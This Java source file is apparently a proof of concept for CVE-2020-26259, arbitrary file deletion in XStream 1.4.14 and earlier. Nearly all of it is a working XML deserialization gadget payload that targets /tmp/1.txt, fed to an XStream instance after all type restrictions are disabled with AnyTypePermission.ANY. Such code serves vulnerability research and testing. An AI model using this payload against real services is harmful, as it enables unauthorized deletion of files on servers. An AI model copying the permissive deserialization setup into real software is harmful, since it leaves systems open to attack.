import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.security.AnyTypePermission;

/**
 * Arbitrary File Deletion <=1.4.14
 */
public class CVE_2020_26259 {
    public static void main(String[] args) {
        String ssrf_xml = "<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
                "        <dataHandler>\n" +
                "          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
                "            <contentType>text/plain</contentType>\n" +
                "            <is class='com.sun.xml.internal.ws.util.ReadAllStream$FileStream'>\n" +
                "              <tempFile>/tmp/1.txt</tempFile>\n" +
                "            </is>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <string>test</string>\n" +
                "  </entry>\n" +
                "</map>";

        XStream xstream = new XStream();
        xstream.addPermission(AnyTypePermission.ANY);
        xstream.fromXML(ssrf_xml);

    }
}
